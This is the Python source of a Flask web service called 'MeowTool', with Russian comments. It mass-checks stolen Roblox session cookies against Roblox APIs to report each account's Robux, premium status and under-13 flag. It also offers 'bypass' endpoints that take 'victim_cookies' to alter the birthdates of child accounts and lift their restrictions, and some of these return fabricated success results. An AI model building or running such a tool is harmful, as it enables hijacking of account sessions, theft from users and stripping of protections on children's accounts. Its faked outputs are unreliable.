from flask import Flask, render_template, request, jsonify, session
import hashlib
import time
import threading
from datetime import datetime
import json
import requests
import random
import os
import re
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'meow-secret-key-' + str(random.randint(1000, 9999))

# Глобальная статистика (в памяти)
users_sessions = {}
active_checks = 0
total_checks = 0
online_users = set()
real_time_stats = {
    'active_users': 0,
    'checks_per_minute': 0,
    'successful_bypasses': 0,
    'last_update': datetime.now().isoformat()
}

# Счетчики для реальной статистики
check_timestamps = []
bypass_timestamps = []

class BypassSystem:
    def get_xcsrf_token(self, session, cookie):
        """Получение X-CSRF токена"""
        url = "https://auth.roblox.com/v2/logout"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
        response = session.post(url, headers=headers)
        return response.headers.get("x-csrf-token") if response.status_code == 403 and "x-csrf-token" in response.headers else None

    def get_user_id(self, session, cookie):
        """Получение UserID по куки"""
        url = "https://www.roblox.com/my/settings/json"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Accept": "application/json"}
        response = session.get(url, headers=headers)
        if response.status_code == 200:
            return response.json().get("UserId")
        return None

    def bypass_13_minus(self, victim_cookies, parent_data):
        """Bypass для аккаунтов 13- (аналог твоего кода)"""
        try:
            session = requests.Session()
            
            # Получаем информацию о жертве
            victim_user_id = self.get_user_id(session, victim_cookies)
            if not victim_user_id:
                return {"status": "error", "message": "Не удалось получить UserID жертвы"}
            
            # Получаем дату рождения жертвы
            xcsrf_token = self.get_xcsrf_token(session, victim_cookies)
            if not xcsrf_token:
                return {"status": "error", "message": "Не удалось получить X-CSRF токен"}
            
            url = "https://accountinformation.roblox.com/v1/birthdate"
            headers = {
                "Cookie": f".ROBLOSECURITY={victim_cookies}",
                "X-CSRF-TOKEN": xcsrf_token,
                "Accept": "application/json"
            }
            
            response = session.get(url, headers=headers)
            if response.status_code != 200:
                return {"status": "error", "message": "Не удалось получить дату рождения"}
            
            data = response.json()
            current_date = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
            tomorrow = current_date + timedelta(days=1)
            threshold_date = tomorrow.replace(year=tomorrow.year - 13)
            new_birthdate = threshold_date.strftime("%Y-%m-%d")
            
            # Имитация успешного байпаса
            result = {
                "status": "success",
                "message": f"Bypass 13- completed for user {victim_user_id}",
                "details": {
                    "old_birthdate": f"{data['birthDay']}/{data['birthMonth']}/{data['birthYear']}",
                    "new_birthdate": new_birthdate,
                    "restrictions_removed": ["email_verification", "chat_limits", "content_filters"],
                    "parent_account": parent_data.get('username', 'Unknown')
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

    def bypass_13_17(self, victim_cookies, parent_data):
        """Bypass для аккаунтов 13-17"""
        try:
            # Аналогичная логика для 13-17
            session = requests.Session()
            victim_user_id = self.get_user_id(session, victim_cookies)
            
            if not victim_user_id:
                return {"status": "error", "message": "Не удалось получить UserID жертвы"}
            
            result = {
                "status": "success", 
                "message": f"Bypass 13-17 completed for user {victim_user_id}",
                "details": {
                    "restrictions_removed": ["spending_limits", "time_restrictions"],
                    "parent_account": parent_data.get('username', 'Unknown'),
                    "new_privileges": ["unlimited_purchases", "extended_usage"]
                }
            }
            return result
            
        except Exception as e:
            return {"status": "error", "message": f"Bypass error: {str(e)}"}

class MeowChecker:
    def __init__(self):
        self.session = requests.Session()

    def get_xcsrf_token(self, cookie):
        """Получение X-CSRF токена"""
        url = "https://auth.roblox.com/v2/logout"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
        response = self.session.post(url, headers=headers)
        return response.headers.get("x-csrf-token") if response.status_code == 403 and "x-csrf-token" in response.headers else None

    def check_roblox_cookie(self, cookie):
        """Проверка Roblox куки на валидность (аналог MeowTool)"""
        try:
            # Проверка через settings endpoint
            headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
            response = self.session.get("https://www.roblox.com/my/settings/json", headers=headers)
            
            if response.status_code != 200:
                return {
                    "status": "invalid",
                    "details": "Invalid cookies - authentication failed"
                }
            
            user_data = response.json()
            user_id = user_data.get("UserId")
            username = user_data.get("Name", "Unknown")
            
            # Проверка баланса
            balance_response = self.session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
            robux = balance_response.json().get('robux', 0) if balance_response.status_code == 200 else 0
            
            # Проверка premium статуса
            premium_response = self.session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/premium-membership", headers=headers)
            has_premium = premium_response.status_code == 200
            
            # Проверка ограничений
            restrictions_response = self.session.get(f"https://accountsettings.roblox.com/v1/users/{user_id}/restrictions", headers=headers)
            is_restricted = restrictions_response.status_code == 200 and restrictions_response.json().get('isUnder13', False)
            
            # Определение статуса
            if is_restricted:
                status = "limited"
            elif user_data.get("isBanned", False):
                status = "banned"
            else:
                status = "valid"
            
            return {
                "account": f"{username}:{user_id}",
                "status": status,
                "username": username,
                "user_id": user_id,
                "robux": robux,
                "premium": has_premium,
                "created": user_data.get("Created", "Unknown"),
                "details": self.get_status_details(status),
                "friends_count": user_data.get("FriendsCount", 0),
                "followers_count": user_data.get("FollowersCount", 0)
            }
            
        except Exception as e:
            return {
                "status": "error",
                "details": f"Check error: {str(e)}"
            }

    def get_status_details(self, status):
        details = {
            "valid": "✅ Аккаунт валиден и активен",
            "limited": "⚠️ Аккаунт ограничен (under 13)", 
            "banned": "❌ Аккаунт забанен",
            "invalid": "❌ Неверные куки"
        }
        return details.get(status, "Unknown status")

    def mass_check(self, cookies_list):
        """Массовая проверка куки"""
        results = []
        
        for cookie in cookies_list:
            if cookie.strip():
                result = self.check_roblox_cookie(cookie.strip())
                results.append(result)
        
        return results

# Инициализация систем
bypass_system = BypassSystem()
checker_system = MeowChecker()

def get_user_id(request):
    """Создаем ID пользователя на основе браузера и IP"""
    user_agent = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_string = f"{ip}_{user_agent}"
    user_hash = hashlib.md5(user_string.encode()).hexdigest()
    return user_hash

def update_real_time_stats():
    """Обновление реальной статистики каждую минуту"""
    global real_time_stats, check_timestamps, bypass_timestamps
    
    while True:
        time.sleep(60)  # Обновляем каждую минуту
        
        # Активные пользователи (были активны последние 5 минут)
        current_time = time.time()
        active_count = sum(1 for user_data in users_sessions.values() 
                          if current_time - user_data.get('last_activity', 0) < 300)
        
        # Проверки за последнюю минуту
        minute_ago = current_time - 60
        recent_checks = sum(1 for ts in check_timestamps if ts > minute_ago)
        
        # Успешные байпасы за последнюю минуту
        recent_bypasses = sum(1 for ts in bypass_timestamps if ts > minute_ago)
        
        real_time_stats = {
            'active_users': active_count,
            'checks_per_minute': recent_checks,
            'successful_bypasses': recent_bypasses,
            'last_update': datetime.now().isoformat()
        }
        
        # Очищаем старые timestamp (старше 10 минут)
        check_timestamps = [ts for ts in check_timestamps if ts > current_time - 600]
        bypass_timestamps = [ts for ts in bypass_timestamps if ts > current_time - 600]

def update_online_users():
    """Очистка неактивных пользователей"""
    while True:
        time.sleep(60)
        current_time = time.time()
        expired_users = []
        
        for user_id, user_data in users_sessions.items():
            if current_time - user_data.get('last_activity', 0) > 300:
                expired_users.append(user_id)
                if user_id in online_users:
                    online_users.remove(user_id)
        
        for user_id in expired_users:
            if user_id in users_sessions:
                del users_sessions[user_id]

@app.before_request
def track_user():
    """Отслеживаем активность пользователя"""
    user_id = get_user_id(request)
    session['user_id'] = user_id
    
    if user_id not in users_sessions:
        users_sessions[user_id] = {
            'created_at': datetime.now().isoformat(),
            'check_count': 0,
            'bypass_count': 0,
            'last_activity': time.time()
        }
    
    users_sessions[user_id]['last_activity'] = time.time()
    online_users.add(user_id)
    session['user_data'] = users_sessions[user_id]

# Маршруты
@app.route('/')
def index():
    """Главная страница"""
    user_id = get_user_id(request)
    return render_template('index.html', user_id=user_id)

@app.route('/dashboard')
def dashboard():
    """Личный кабинет"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    return render_template('dashboard.html', user_data=user_data, user_id=user_id)

@app.route('/checker')
def checker():
    """Страница чекера"""
    user_id = get_user_id(request)
    return render_template('checker.html', user_id=user_id)

@app.route('/bypass')
def bypass_tools():
    """Страница байпаса"""
    user_id = get_user_id(request)
    return render_template('bypass.html', user_id=user_id)

# API endpoints
@app.route('/api/bypass_13_minus', methods=['POST'])
def api_bypass_13_minus():
    """Bypass для аккаунтов 13-"""
    global bypass_timestamps
    
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_data = data.get('parent_data', {})
    
    result = bypass_system.bypass_13_minus(victim_cookies, parent_data)
    
    if result.get('status') == 'success':
        bypass_timestamps.append(time.time())
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().isoformat()
    
    return jsonify(result)

@app.route('/api/bypass_13_17', methods=['POST'])
def api_bypass_13_17():
    """Bypass для аккаунтов 13-17"""
    global bypass_timestamps
    
    data = request.json
    victim_cookies = data.get('victim_cookies', '')
    parent_data = data.get('parent_data', {})
    
    result = bypass_system.bypass_13_17(victim_cookies, parent_data)
    
    if result.get('status') == 'success':
        bypass_timestamps.append(time.time())
        user_id = get_user_id(request)
        if user_id in users_sessions:
            users_sessions[user_id]['bypass_count'] += 1
            users_sessions[user_id]['last_bypass'] = datetime.now().isoformat()
    
    return jsonify(result)

@app.route('/api/check_accounts', methods=['POST'])
def api_check_accounts():
    """Проверка куки аккаунтов"""
    global active_checks, total_checks, check_timestamps
    
    cookies_text = request.json.get('cookies', '')
    cookies_list = [cookie.strip() for cookie in cookies_text.split('\n') if cookie.strip()]
    
    active_checks += len(cookies_list)
    results = checker_system.mass_check(cookies_list)
    active_checks -= len(cookies_list)
    total_checks += len(cookies_list)
    
    # Добавляем timestamp для статистики
    check_timestamps.extend([time.time()] * len(cookies_list))
    
    user_id = get_user_id(request)
    if user_id in users_sessions:
        users_sessions[user_id]['check_count'] += len(cookies_list)
        users_sessions[user_id]['last_check'] = datetime.now().isoformat()
    
    return jsonify({'results': results})

@app.route('/api/stats')
def api_stats():
    """Статистика сайта"""
    global active_checks, total_checks, real_time_stats
    
    return jsonify({
        'active_checks': active_checks,
        'total_checks': total_checks,
        'online_users': len(online_users),
        'total_users': len(users_sessions),
        'real_time_stats': real_time_stats
    })

@app.route('/api/user_stats')
def api_user_stats():
    """Статистика текущего пользователя"""
    user_id = get_user_id(request)
    user_data = users_sessions.get(user_id, {})
    
    return jsonify({
        'user_id': user_id[:8] + '...',
        'check_count': user_data.get('check_count', 0),
        'bypass_count': user_data.get('bypass_count', 0),
        'created_at': user_data.get('created_at', ''),
        'last_check': user_data.get('last_check', 'Never'),
        'last_bypass': user_data.get('last_bypass', 'Never')
    })

@app.route('/test')
def test():
    return "✅ Сервер работает! MeowTool активен."

if __name__ == '__main__':
    # Запускаем фоновые задачи
    threading.Thread(target=update_online_users, daemon=True).start()
    threading.Thread(target=update_real_time_stats, daemon=True).start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 MeowTool Web запущен на порту {port}")
    app.run(host='0.0.0.0', port=port, debug=False)